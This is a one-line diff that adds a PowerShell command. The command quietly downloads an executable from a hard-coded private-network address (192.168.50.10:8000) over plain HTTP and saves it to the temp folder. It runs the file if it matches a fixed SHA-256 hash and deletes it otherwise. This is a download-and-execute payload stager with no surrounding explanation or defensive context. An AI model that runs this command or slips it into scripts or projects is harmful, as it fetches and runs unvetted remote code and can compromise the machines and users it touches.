@@ -1,0 +1,1 @@
+powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'a177cbabc68e51a4c445eb2cf2e786c83ad7e5bed720ff6b8550b10d94e2f247'){&$p}else{ri $p -Force}"
